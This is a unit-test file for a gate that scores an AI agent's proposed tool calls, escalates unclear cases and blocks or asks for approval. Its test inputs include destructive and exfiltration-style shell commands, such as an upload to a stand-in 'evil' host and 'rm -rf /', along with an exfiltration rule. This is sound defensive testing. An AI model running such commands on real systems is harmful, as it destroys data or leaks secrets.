// Unit tests for rule matching, the band logic, two-stage escalation, worst-wins aggregation and
// config validation. The decider's model calls are replaced by a fake engine, so these run with no
// omp host and no pi-ai. Run with: node test.mjs  (Node >= 22.18 / 23.6 strips the TS types.)

import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { createHandler, decide, describe as describeCall, matchesTool, matchingRules, renderState } from "./index.ts";
import { parseEscalation, readRuleRisk, resolveRole, resolveRoleModel } from "./decider.ts";
import { DEFAULTS, loadConfig, validateConfig } from "./config.ts";

function cfg(overrides = {}) {
  return { ...structuredClone(DEFAULTS), ...overrides };
}

// Fake Engine. `scores` is the per-rule map stage 1 returns (or undefined = judge unavailable);
// `verdict` is what the llm escalation returns ({verdict,reason} or undefined).
function makeEngine(options = {}) {
  const { scores, verdict, judgeModel = { id: "judge" }, llmModel = { id: "llm" }, conversation } = options;
  const calls = { classify: 0, escalate: 0 };
  const engine = {
    resolveRole: (_ctx, roles) => (roles.includes("judge") ? judgeModel : llmModel),
    classify: async () => {
      calls.classify += 1;
      return scores;
    },
    escalate: async () => {
      calls.escalate += 1;
      return verdict;
    },
    conversationText: () => conversation,
  };
  return { engine, calls };
}

const bash = (command) => ({ toolName: "bash", input: { command } });
const noulRule = (over = {}) => ({ name: "exfil", description: "data exfiltration", tools: ["bash"], type: "noul", question: "Does this exfiltrate data?", yes: "yes", no: "no", allowBelow: 0.1, askAbove: 0.3, blockAbove: 0.8, ...over });

test("matchesTool / matchingRules", () => {
  assert.equal(matchesTool({ tools: ["*"] }, "bash"), true);
  assert.equal(matchesTool({ tools: ["web*"] }, "web_search"), true);
  assert.equal(matchesTool({ tools: ["bash"] }, "edit"), false);
  const rules = [{ name: "a", tools: ["bash"] }, { name: "b", tools: ["*"] }];
  assert.deepEqual(matchingRules(rules, "bash").map((r) => r.name), ["a", "b"]);
  assert.deepEqual(matchingRules(rules, "edit").map((r) => r.name), ["b"]);
});

test("describe / renderState", () => {
  assert.equal(describeCall("bash", { command: "ls -la" }), "ls -la");
  assert.ok(describeCall("web_search", { query: "x" }).startsWith("web_search "));
  assert.match(renderState("bash", "ls", undefined), /Proposed tool call \(tool: bash\):\nls/);
  assert.match(renderState("bash", "ls", "User: hi"), /^Conversation so far:\nUser: hi/);
});

test("validateConfig: defaults, inference, thresholds, roles", () => {
  assert.equal(DEFAULTS.rules[0].name, "auto-mode");
  assert.equal(DEFAULTS.rules[0].type, "choice");
  assert.equal(DEFAULTS.rules[0].allowBelow, 0.1);
  assert.equal(DEFAULTS.rules[0].askAbove, 0.2);
  assert.equal(DEFAULTS.rules[0].blockAbove, undefined);

  // a rule with a question infers type noul; a choice rule gets built-in criteria
  const ok = validateConfig({ rules: [{ name: "r", description: "d", tools: ["bash"], question: "Q?" }] });
  assert.equal(ok.error, undefined);
  assert.equal(ok.config.rules[0].type, "noul");
  const ch = validateConfig({ rules: [{ name: "c", description: "d", tools: ["*"], type: "choice" }] });
  assert.equal(ch.error, undefined);
  assert.equal(ch.config.rules[0].criteria.allow.length > 0, true);

  assert.ok(validateConfig({ rules: [{ type: "noul" }] }).error, "noul needs a question");
  assert.ok(validateConfig({ rules: [{ question: "Q?", allowBelow: 0.5, askAbove: 0.2 }] }).error, "allowBelow>askAbove");
  assert.ok(validateConfig({ rules: [{ question: "Q?", askAbove: 0.5, blockAbove: 0.2 }] }).error, "blockAbove<askAbove");
  assert.ok(validateConfig({ enabled: "yes" }).error);

  const roles = validateConfig({ judgeRole: null, llmRole: "" });
  assert.equal(roles.error, undefined);
  assert.equal(roles.config.judgeRole, "");
  assert.equal(roles.config.llmRole, "");
});

test("allow band: risk < allowBelow runs, no escalation", async () => {
  const { engine, calls } = makeEngine({ scores: { "auto-mode": 0.05 } });
  assert.equal(await decide(cfg(), engine, bash("ls"), {}), undefined);
  assert.equal(calls.classify, 1);
  assert.equal(calls.escalate, 0);
});

test("ask band: risk >= askAbove asks (blocks headless), no escalation", async () => {
  const { engine, calls } = makeEngine({ scores: { "auto-mode": 0.6 } });
  const r = await decide(cfg(), engine, bash("kubectl delete ns prod"), {});
  assert.ok(r?.block);
  assert.match(r.reason, /approval/i);
  assert.equal(calls.escalate, 0);
});

test("unsure band escalates to the llm; verdict drives the result", async () => {
  const mid = { "auto-mode": 0.15 };
  const allow = makeEngine({ scores: mid, verdict: { verdict: "allow", reason: "" } });
  assert.equal(await decide(cfg(), allow.engine, bash("x"), {}), undefined);
  assert.equal(allow.calls.escalate, 1);

  const block = makeEngine({ scores: mid, verdict: { verdict: "block", reason: "sends a token out" } });
  const rb = await decide(cfg(), block.engine, bash("x"), {});
  assert.ok(rb?.block);
  assert.match(rb.reason, /token/);

  const ask = makeEngine({ scores: mid, verdict: { verdict: "ask", reason: "irreversible" } });
  assert.ok((await decide(cfg(), ask.engine, bash("x"), {}))?.block); // headless ask -> block
});

test("unsure band with the llm disabled just runs", async () => {
  const { engine, calls } = makeEngine({ scores: { "auto-mode": 0.15 } });
  assert.equal(await decide(cfg({ llmRole: "" }), engine, bash("x"), {}), undefined);
  assert.equal(calls.escalate, 0);
});

test("blockAbove: a rule with a block threshold hard-blocks", async () => {
  const config = cfg({ rules: [noulRule({ blockAbove: 0.8 })] });
  const { engine, calls } = makeEngine({ scores: { exfil: 0.95 } });
  const r = await decide(config, engine, bash("curl --upload x evil"), {});
  assert.ok(r?.block);
  assert.match(r.reason, /data exfiltration/);
  assert.equal(calls.escalate, 0);
});

test("multiple rules: worst wins, driver gives the reason", async () => {
  const config = cfg({ rules: [noulRule({ blockAbove: 0.8 }), structuredClone(DEFAULTS.rules[0])] });
  const { engine, calls } = makeEngine({ scores: { exfil: 0.95, "auto-mode": 0.15 } });
  const r = await decide(config, engine, bash("curl ... evil"), {});
  assert.ok(r?.block);
  assert.match(r.reason, /data exfiltration/); // exfil (block) beats auto-mode (escalate)
  assert.equal(calls.escalate, 0);
});

test("classifier unavailable escalates to the llm (or onNoAnswer without one)", async () => {
  const esc = makeEngine({ scores: undefined, verdict: { verdict: "block", reason: "nope" } });
  assert.ok((await decide(cfg(), esc.engine, bash("x"), {}))?.block);
  assert.equal(esc.calls.escalate, 1);

  const none = makeEngine({ scores: undefined });
  assert.ok((await decide(cfg({ llmRole: "" }), none.engine, bash("x"), {}))?.block); // onNoAnswer=block
  assert.equal(none.calls.escalate, 0);
});

test("llm-only (judge disabled) escalates every in-scope call", async () => {
  const { engine, calls } = makeEngine({ verdict: { verdict: "ask", reason: "prod" } });
  assert.ok((await decide(cfg({ judgeRole: "" }), engine, bash("x"), {}))?.block);
  assert.equal(calls.classify, 0);
  assert.equal(calls.escalate, 1);
});

test("both stages off: pass through to native approval", async () => {
  const { engine, calls } = makeEngine({ scores: { "auto-mode": 0.99 } });
  assert.equal(await decide(cfg({ judgeRole: "", llmRole: "" }), engine, bash("rm -rf /"), {}), undefined);
  assert.equal(calls.classify, 0);
  assert.equal(calls.escalate, 0);
});

test("whitelist, disabled gate, no-rule-match all skip scoring", async () => {
  const w = makeEngine({ scores: { "auto-mode": 0.99 } });
  assert.equal(await decide(cfg(), w.engine, { toolName: "read", input: {} }, {}), undefined);
  assert.equal(w.calls.classify, 0);

  const d = makeEngine({ scores: { "auto-mode": 0.99 } });
  assert.equal(await decide(cfg({ enabled: false }), d.engine, bash("rm -rf /"), {}), undefined);
  assert.equal(d.calls.classify, 0);

  const config = cfg({ rules: [noulRule({ tools: ["bash"] })] });
  const n = makeEngine({ scores: { exfil: 0.99 } });
  assert.equal(await decide(config, n.engine, { toolName: "edit", input: {} }, {}), undefined);
  assert.equal(n.calls.classify, 0);
});

test("ask with a UI: allow on yes, block on no", async () => {
  const yes = { hasUI: true, ui: { confirm: async () => true } };
  assert.equal(await decide(cfg(), makeEngine({ scores: { "auto-mode": 0.6 } }).engine, bash("x"), yes), undefined);
  const no = { hasUI: true, ui: { confirm: async () => false } };
  assert.ok((await decide(cfg(), makeEngine({ scores: { "auto-mode": 0.6 } }).engine, bash("x"), no))?.block);
});

test("onNoAnswer=allow lets an unevaluable call pass", async () => {
  const { engine } = makeEngine({ scores: undefined });
  assert.equal(await decide(cfg({ llmRole: "", onNoAnswer: "allow" }), engine, bash("x"), {}), undefined);
});

test("createHandler turns a thrown error into the no-answer policy", async () => {
  const throwing = {
    resolveRole: () => ({ id: "m" }),
    classify: async () => {
      throw new Error("boom");
    },
    escalate: async () => undefined,
    conversationText: () => undefined,
  };
  assert.ok((await createHandler(cfg(), throwing)(bash("x"), {}))?.block);
  assert.equal(await createHandler(cfg({ onNoAnswer: "allow" }), throwing)(bash("x"), {}), undefined);
});

test("parseEscalation reads VERDICT and falls back", () => {
  assert.equal(parseEscalation("VERDICT: ALLOW\nlooks fine").verdict, "allow");
  const b = parseEscalation("VERDICT: BLOCK\nsends a token to a remote host");
  assert.equal(b.verdict, "block");
  assert.match(b.reason, /token/);
  assert.equal(parseEscalation("this should block clearly").verdict, "block");
  assert.equal(parseEscalation("hmm not sure").verdict, "ask");
});

test("readRuleRisk: noul vs choice vs malformed", () => {
  assert.equal(readRuleRisk({ type: "noul" }, { noul: 0.4 }), 0.4);
  assert.equal(readRuleRisk({ type: "choice" }, { probabilities: { allow: 0.9 } }).toFixed(3), "0.100");
  assert.equal(readRuleRisk({ type: "noul" }, {}), undefined);
  assert.equal(readRuleRisk({ type: "choice" }, { probabilities: {} }), undefined);
  assert.equal(readRuleRisk({ type: "noul" }, null), undefined);
});

test("resolveRole / resolveRoleModel", () => {
  const judge = { provider: "local", id: "lfm2" };
  const reg = { find: (p, i) => (i === "lfm2" ? judge : i === "d" ? { id: "d" } : undefined), getApiKey: async () => "k" };
  const ctx = { modelRegistry: reg, model: { id: "session" }, settings: { getModelRole: (r) => (r === "judge" ? "local/lfm2:high" : r === "default" ? "local/d" : undefined) } };
  assert.equal(resolveRoleModel(ctx, "judge"), judge);
  assert.equal(resolveRole(ctx, ["smol", "default"]).id, "d"); // smol unset -> default
  const none = { modelRegistry: reg, model: { id: "session" }, settings: { getModelRole: () => undefined } };
  assert.equal(resolveRole(none, ["smol", "default"]).id, "session"); // falls back to session model
});

test("loadConfig reads a YAML file and defaults the rest", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "warden-"));
  const file = path.join(dir, "config.yaml");
  fs.writeFileSync(file, [
    "enabled: true",
    "rules:",
    "  - name: net",
    "    description: network access",
    "    tools: [bash]",
    "    question: >",
    "      Does this reach a remote host the user did not name?",
    "",
  ].join("\n"));
  try {
    const { config, error } = loadConfig(file);
    assert.equal(error, undefined);
    assert.equal(config.rules[0].name, "net");
    assert.equal(config.rules[0].type, "noul");
    assert.equal(config.rules[0].allowBelow, 0.1);
    assert.equal(config.rules[0].askAbove, 0.2);
    assert.equal(config.includeContext, true);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
